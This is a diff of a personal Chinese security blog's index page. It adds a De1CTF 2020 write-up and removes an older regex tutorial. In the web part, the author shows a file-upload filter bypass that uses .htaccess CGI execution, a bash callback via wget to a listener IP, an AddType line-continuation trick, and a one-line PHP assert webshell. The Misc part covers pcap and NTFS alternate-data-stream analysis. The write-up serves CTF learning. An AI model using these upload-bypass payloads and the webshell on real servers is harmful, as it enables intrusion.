@@ -151,6 +151,99 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/05/De1CTF-2020-WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="http://q1.qlogo.cn/g?b=qq&nk=948375961&s=640">
+      <meta itemprop="name" content="SNCKER">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sncker's blog - qq948375961">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/blog/2020/05/05/De1CTF-2020-WriteUp/" class="post-title-link" itemprop="url">De1CTF|2020-WriteUp</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-05-05 17:45:57 / 修改时间：22:36:29" itemprop="dateCreated datePublished" datetime="2020-05-05T17:45:57+08:00">2020-05-05</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前两天的自闭De1CTF我只想说，真的太棒了，题目质量很高，水准真的没得说，学到不少东西。也看到了一些国外著名战队，膜拜一下，白天国内师傅疯狂上分，半夜又轮到国外的师傅，很激烈。当然国内外都有师傅通宵干哈哈哈。<br>相比之下ISCC2020我也没啥好说的了，国内的CTF环境真的是个迷。不管怎样，还是希望国内这一块越走越好吧。不过起码De1CTF还是咱们国内的社区承办的哈哈<br>然后博主也是很有自知之明，去当个分母而已，就死磕最多人解出的两道题（非签到），其它的看都不看了哈哈哈。  </p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200505205921.png" alt><br>一道上传题。<br>简单的测了一下过滤。<br>首先文件名过滤ph。<br>文件内容过滤perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!<br>然后也通过Content-Type判断文件格式。<br>发现环境是  </p>
+<blockquote>
+<p>Server: Apache/2.4.6 (CentOS) PHP/5.4.16</p>
+</blockquote>
+<p>找了一下存在CVE-2017-15715漏洞，但是不顶用，因为ph被过滤了。<br>最后就是改Content-Type: image/jpeg就可以上传任意文件了，但是内容被限制了，像php这种也是被过滤的。<br>就想到短标签，采用&lt;?。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505211036.png" alt><br>然后就是解析，首先这里是没有明显的可以用来包含的地方。然后因为可以上传任意文件，就想到了用.htaccess来解析。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505211415.png" alt><br>但是，改解析的内容也包含了php，传不上去。。。<br>哭了，疯狂地搜索htaccess的奇淫技巧，看到了一篇利用htaccess调用CGI执行命令的文章。<br><a href="https://www.freebuf.com/vuls/218495.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218495.html</a><br>然后看到过滤里是没有bash的，兴奋起来了。<br>按照文章的思路测试<br>上传.htaccess</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options ExecCGI</span><br><span class="line">AddHandler cgi-script .xx</span><br></pre></td></tr></table></figure>
+
+<p>再上传1.xx，要验证命令是否执行，我用wget来请求我的监听服务器。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">wget 111.111.111.111:12345</span><br></pre></td></tr></table></figure>
+
+<p>访问1.xx<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505212523.png" alt><br>500了，服务器监听也没结果。然后我上传一张正常的图片，正常访问，说明.htaccess文件格式没错。<br>那是不是没有wget呢，于是我又测试了nc，一样没反应。同样的也测试了FastCGI，都不行。然后就放弃了这条思路，和胜利擦肩而过，回想一下这点错就错在使用了不靠谱的方法来检验命令执行。<br>回到解析的思路上，因为前面有CVE-2017-15715的换行绕过黑名单，所以这里自然地想到这个htaccess可以不可以用换行来绕过过滤。<br>于是我尝试了直接回车换行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-p</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>
+
+<p>以及插入一个0x0A。区别就是直接在内容中回车是回车换行\r\n两个字节也就是0x0D和0x0A，直接插入0x0A就只是换行。<br>但是都不行，全部500了，说明格式错误了。到这里是彻底放弃了。又和胜利擦肩而过，但凡再搜一下htaccess的换行方式也不会这么惨了哈哈。。<br>然后接下来是别人的wp了orz，先说预期解。<br>预期解还真是用CGI调用来执行命令。先看一个比较正规的CGI编程解。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;Content-Type:text/html;charset=utf-8&quot;</span><br><span class="line">echo &quot;&quot; #空行，结束头</span><br><span class="line">echo cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>反正我是复现不出来，依旧500。<br>但是有个国外的师傅发现虽然是500状态码，但是命令已经执行了，他利用的是touch 123.txt，然后访问发现确实创建了文件最后通过cp /flag ./flag.txt获取flag。但我按照他的思路也复现不了，不过还是不得不佩服一下，毕竟自己没想到这个简单的验证思路。<br>然后就是非预期解了，这个是真的可惜。<br>非预期确确实实是htaccess换行绕过，但是确是这样的。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>
+
+<p>真的自闭了啊。<br>然后复现也踩坑了，短标签&lt;?是不解析的，linux环境下默认关闭，但win是默认开启的。搞得我一度怀疑自己被针对。但是&lt;?=是可以解析的。  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=assert($_POST[<span class="string">"test"</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>我也不知道为啥我的@eval也用不了，真的脸太黑了？唉T.T<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505222840.png" alt><br>最后没啥好说的了。通读三篇官方文档，做了一点点测试和总结。<br><a href="https://www.php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.file.per-user.php</a><br><a href="https://www.php.net/manual/zh/language.basic-syntax.phptags.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.basic-syntax.phptags.php</a><br><a href="https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag" target="_blank" rel="noopener">https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag</a><br>首先短标签是需要开启short_open_tag的，linux默认是关闭的，但是php5.4后&lt;?=短标签总是可用的，而&lt;?则设置影响。<br>因为有参考一道类似题，SUCTF2019的同名题，所以我想到了既然可以上传任意文件，那我是否可以上传.user.ini来开启短标签呢？但是测试不成功，我从官方文档找到失败的可能原因就是php.ini里的一项设置。  </p>
+<blockquote>
+<p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。 </p>
+</blockquote>
+<p>也就是说.user.ini并不是实时生效的，而题目的环境5分钟重置一次，所以很难验证。<br>官方文档有说，apache的htaccess可以达到.user.ini的同样效果，经过我的搜索，找到了可以通过php_value来设置。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value short_open_tag 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/sncker/resource/raw/master/image/20200505223214.jpg" alt></p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Misc-Chowder"><a href="#Misc-Chowder" class="headerlink" title="Misc_Chowder"></a>Misc_Chowder</h2><p>下放文件也是用的googledrive。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505180223.png" alt><br>下载下来是一个Misc_Chowder.pacp流量包，直接WireShark分析。过滤出http，发现上传动作。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505191751.png" alt><br>看到在120开头的ip里上传了6次图片，1.jpg,2.jpg…<br>还原出来1.jpg发现是正常图片，感觉是干扰的，然后在流量末尾发现往另一个ip上传一张7.png<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505192335.png" alt><br>还原出来是一个网盘的链接的图片。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505192728.png" alt><br>提取网站下载文件，一个readme.zip，里面有一个readme.docx，打开看一下只有两个表情包。。。这个也没啥考点了，改zip后缀用压缩程序打开。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505193452.png" alt><br>提取出压缩包，里面是一张图片，发现加密。根据举办方的hint，按格式DE****进行破解，跑了20多分钟得到密码：DE34Q1<br>解压得到图片。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505193823.png" alt><br>。。。。。。看了一下这张图片大小有28k，用binwalk看一下。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505194238.png" alt><br>有个RAR压缩包，加个e参数分解一下。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505194444.png" alt><br>RAR里两个txt都没用，fake flag。<br>然后就是第一大坑。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505194734.png" alt><br>这张写着“I AM FLAG”的666.jpg，它其实是一张png，让我一度认为flag在它这里，我一顿分析，各种常规套路都试了。<br>最后挂在这里了。后来看师傅们的wp，竟然是ADS隐写。。。<br>回到RAR压缩包，重新审视这个RAR，用winhex打开。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505201053.png" alt><br>在末尾可以发现一个fffffffflllll.txt的文件名，这个STM是NTFS ADS的一种标记头，ADS的格式都是”宿主文件”:”附属文件”，dir /r才可以看到。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200505201632.png" alt></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad <span class="number">666</span>.jpg:fffffffflllll.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/sncker/resource/raw/master/image/20200505201905.png" alt><br>最后说一下第二大坑，测试发现只有用winrar解压出来才能还原出这个交换数据流。orz  </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/25/攻防世界CTF-WriteUp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -924,170 +1017,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/Python网络爬虫-正则表达式/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="http://q1.qlogo.cn/g?b=qq&nk=948375961&s=640">
-      <meta itemprop="name" content="SNCKER">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sncker's blog - qq948375961">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/blog/2019/07/28/Python网络爬虫-正则表达式/" class="post-title-link" itemprop="url">Python网络爬虫-正则表达式</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-07-28 10:45:00" itemprop="dateCreated datePublished" datetime="2019-07-28T10:45:00+08:00">2019-07-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-01-02 20:34:01" itemprop="dateModified" datetime="2020-01-02T20:34:01+08:00">2020-01-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/blog/categories/Python/" itemprop="url" rel="index"><span itemprop="name">Python</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/blog/categories/Python/爬虫/" itemprop="url" rel="index"><span itemprop="name">爬虫</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>用来表示<strong>一组</strong>字符串的表达式，通用字符串表达框架，十分强大。<br>主要应用在字符串匹配中。</p>
-<h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><table>
-<thead>
-<tr>
-<th align="center">操作符</th>
-<th align="center">说明</th>
-<th align="center">实例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">.</td>
-<td align="center">表示任何单个字符</td>
-<td align="center"></td>
-</tr>
-<tr>
-<td align="center">[ ]</td>
-<td align="center">字符集，对单个字符给出取值范围</td>
-<td align="center">[abc]表示a、b、c，[a‐z]表示a到z单个字符</td>
-</tr>
-<tr>
-<td align="center">[^ ]</td>
-<td align="center">非字符集，对单个字符给出排除范围</td>
-<td align="center">[^abc]表示非a或b或c的单个字符</td>
-</tr>
-<tr>
-<td align="center">*</td>
-<td align="center">前一个字符0次或无限次扩展</td>
-<td align="center">abc* 表示ab、abc、abcc、abccc等</td>
-</tr>
-<tr>
-<td align="center">+</td>
-<td align="center">前一个字符1次或无限次扩展</td>
-<td align="center">abc+ 表示abc、abcc、abccc等</td>
-</tr>
-<tr>
-<td align="center">?</td>
-<td align="center">前一个字符0次或1次扩展</td>
-<td align="center">abc? 表示ab、abc</td>
-</tr>
-<tr>
-<td align="center">|</td>
-<td align="center">左右表达式任意一个</td>
-<td align="center">abc|def表示abc、def</td>
-</tr>
-<tr>
-<td align="center">{m}</td>
-<td align="center">扩展前一个字符m次</td>
-<td align="center">ab{2}c表示abbc</td>
-</tr>
-<tr>
-<td align="center">{m,n}</td>
-<td align="center">扩展前一个字符m至n次（含n）</td>
-<td align="center">ab{1,2}c表示abc、abbc</td>
-</tr>
-<tr>
-<td align="center">^</td>
-<td align="center">匹配字符串开头</td>
-<td align="center">^abc表示abc且在一个字符串的开头</td>
-</tr>
-<tr>
-<td align="center">$</td>
-<td align="center">匹配字符串结尾</td>
-<td align="center">abc$表示abc且在一个字符串的结尾</td>
-</tr>
-<tr>
-<td align="center">( )</td>
-<td align="center">分组标记，内部只能使用| 操作符</td>
-<td align="center">(abc)表示abc，(abc|def)表示abc、def</td>
-</tr>
-<tr>
-<td align="center">\d</td>
-<td align="center">数字，等价于[0‐9]</td>
-<td align="center"></td>
-</tr>
-<tr>
-<td align="center">\w</td>
-<td align="center">单词字符，等价于[A‐Za‐z0‐9_]</td>
-<td align="center"></td>
-</tr>
-</tbody></table>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/blog/2019/07/28/Python网络爬虫-正则表达式/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1159,7 +1088,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/blog/archives/">
         
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
